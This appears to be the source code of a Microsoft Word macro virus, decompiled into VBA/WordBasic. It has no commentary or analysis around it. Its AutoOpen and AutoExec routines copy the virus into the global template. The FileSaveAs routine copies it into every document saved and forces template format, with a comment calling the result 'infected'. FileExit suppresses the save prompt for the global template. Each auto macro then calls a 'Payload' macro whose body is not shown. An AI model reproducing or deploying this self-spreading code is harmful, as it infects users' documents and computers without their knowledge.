   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileSaveAs"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSaveAs.MAIN"
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)    'declare dialog as type FileSaveAs
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg      'execute the dialog.

   'Is the document of Type=(WordDocument or Template) ?

   If (dlg.Format = 0) Or (dlg.Format = 1) Then

       'Copy Macro's from Global data area into document.
   Rem     MacroCopy "Global:AutoExec",  WindowName$() + ":AutoExec", 1
   Rem     MacroCopy "Global:AutoOpen",  WindowName$() + ":AutoOpen", 1
   Rem     MacroCopy "Global:FileSaveAs", WindowName$() + ":FileSaveAs", 1
   Rem     MacroCopy "Global:ToolsMacro", WindowName$() + ":ToolsMacro", 1
   Rem     MacroCopy "Global:FilePrint", WindowName$() + ":FilePrint", 1
   Rem     MacroCopy "Global:FilePrintDefault", WindowName$() + ":FilePrintDefault", 1
   Rem     MacroCopy "Global:InsertPayload", WindowName$() + ":InsertPayload", 1
   Rem     MacroCopy "Global:Payload", WindowName$() + ":Payload", 1

      WordBasic.MacroCopy "Global:AutoExec", WordBasic.[WindowName$]() + ":AutoExec"
       WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[WindowName$]() + ":AutoOpen"
       WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[WindowName$]() + ":FileSaveAs"
   Rem     MacroCopy "Global:ToolsMacro", WindowName$() + ":ToolsMacro"
       WordBasic.MacroCopy "Global:FilePrint", WordBasic.[WindowName$]() + ":FilePrint"
       WordBasic.MacroCopy "Global:FilePrintDefault", WordBasic.[WindowName$]() + ":FilePrintDefault"
       WordBasic.MacroCopy "Global:InsertPayload", WordBasic.[WindowName$]() + ":InsertPayload"
       WordBasic.MacroCopy "Global:Payload", WordBasic.[WindowName$]() + ":Payload"

       'Set to save document as a template.
       dlg.Format = 1
   End If

   WordBasic.FileSaveAs dlg  'save the document infected.
   End Sub

   Attribute VB_Name = "FileExit"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "Quits Microsoft Word and prompts to save the documents"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileExit.MAIN"
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
   WordBasic.FileExit
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   If CheckInstalled = 0 Then
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExec", "Global:AutoExec"
   Rem     MacroCopy WindowName$() + ":ToolsMacro", "Global:ToolsMacro"
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOpen", "Global:AutoOpen"
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileSaveAs", "Global:FileSaveAs"
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FilePrint", "Global:FilePrint"
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FilePrintDefault", "Global:FilePrintDefault"
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":InsertPayload", "Global:InsertPayload"
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":PayLoad", "Global:Payload"
   End If
   WordBasic.Call "Payload"
   End Sub

   Private Function CheckInstalled()
   Dim i
       'Check if AutoExec macro already exists.
       CheckInstalled = 0
       If WordBasic.CountMacros(0) > 0 Then
           For i = 1 To WordBasic.CountMacros(0)
               If WordBasic.[MacroName$](i, 0) = "AutoExec" Then
                   CheckInstalled = 1
               End If
           Next i
       End If
   End Function

   Attribute VB_Name = "AutoExec"

   Public Sub MAIN()
   If CheckInstalled = 0 Then
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExec", "Global:AutoExec"
   Rem     MacroCopy WindowName$() + ":ToolsMacro", "Global:ToolsMacro", 1
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOpen", "Global:AutoOpen"
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FileSaveAs", "Global:FileSaveAs"
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FilePrint", "Global:FilePrint"
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FilePrintDefault", "Global:FilePrintDefault"
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":InsertPayload", "Global:InsertPayload"
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":PayLoad", "Global:Payload"
   End If
   WordBasic.Call "Payload"
   End Sub

   Private Function CheckInstalled()
   Dim i
       'Check if AutoExec macro already exists.
       CheckInstalled = 0
       If WordBasic.CountMacros(0) > 0 Then
           For i = 1 To WordBasic.CountMacros(0)
               If WordBasic.[MacroName$](i, 0) = "AutoExec" Then
                   CheckInstalled = 1
               End If
           Next i
       End If
   End Function
